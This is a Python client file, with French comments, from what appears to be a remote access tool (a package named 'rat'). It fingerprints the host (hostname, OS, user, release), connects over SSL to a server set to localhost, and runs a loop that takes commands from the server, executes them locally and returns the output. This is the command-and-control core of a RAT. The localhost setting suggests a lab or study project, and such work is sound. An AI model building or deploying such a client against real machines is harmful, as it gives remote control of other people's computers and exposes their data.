# Client principal du système
# - collecte les infos machine
# - se connecte au serveur en SSL
# - reçoit des commandes et exécute les modules locaux

from rat.client.client import SSLClient
from rat.utils.logger import setup_logger
import json
import platform
import socket
import getpass

logger = setup_logger()


# Collecte des informations système envoyées au serveur lors de la connexion
def collect_client_info():
    return {
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "user": getpass.getuser(),
        "release": platform.release(),
    }


def main():

    # Création du client SSL (connexion sécurisée)
    client = SSLClient(
        server_host="127.0.0.1",
        server_port=8888,
        sni_hostname="localhost",
        client_cert="certs/cert.pem",
        client_key="certs/key.pem",
    )

    try:
        # Connexion SSL au serveur
        client.connect()

        print("Connected to server")

        # Envoi des infos système au serveur (identification initiale)
        info = collect_client_info()
        client.send(json.dumps(info))

        # Boucle principale : réception des commandes serveur
        while True:

            command = client.receive()

            if command is None:
                print("Server disconnected")
                break

            print("Received command:", command)

            # Exécution locale de la commande via le registry
            response = client.execute_command(command)

            # Retour de la réponse au serveur
            client.send(response)

    except Exception as e:
        print("Client error:", e)

    finally:
        # Fermeture propre des sockets
        client.close()


if __name__ == "__main__":
    main()
